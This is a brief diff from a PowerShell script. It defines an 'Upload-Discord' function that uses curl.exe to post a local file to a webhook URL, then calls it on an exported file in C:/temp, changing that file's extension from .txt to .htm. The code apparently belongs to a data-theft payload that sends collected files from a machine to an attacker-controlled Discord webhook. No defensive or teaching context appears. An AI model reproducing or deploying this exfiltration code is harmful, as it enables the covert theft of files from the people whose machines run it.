@@ -19,4 +19,4 @@ function Upload-Discord {
     if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
     }
     
-Upload-Discord -file "file:///C:/temp/export.txt"
+Upload-Discord -file "file:///C:/temp/export.htm"
